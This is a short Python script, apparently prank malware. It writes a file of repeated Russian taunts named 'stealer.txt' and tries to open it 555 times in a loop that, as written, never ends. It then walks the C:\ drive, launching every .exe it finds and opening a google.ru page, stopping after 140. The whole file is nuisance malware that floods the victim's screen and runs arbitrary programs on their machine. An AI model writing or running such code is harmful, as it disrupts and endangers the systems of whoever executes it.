import os
import webbrowser

i = 0
newpath = r'C:\\hack\\boy'
if not os.path.exists(newpath):
	os.makedirs(newpath)
with open("stealer.txt",'w') as stealer:
	stealer.write('''
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
ТЫ ШО ДУРАК
''')
i = 0
while i<555:
    webbrowser.open('stealer.txt')
folder = 'C:\\'
for folder, subfolders, files in os.walk(folder):
	for file in files:
		if file.endswith(".exe"):
			webbrowser.open(file)
			webbrowser.open('https://www.google.ru/webhp?client=opera&sourceid=opera')
			i=i+1
			if i == 140:#54
				exit()



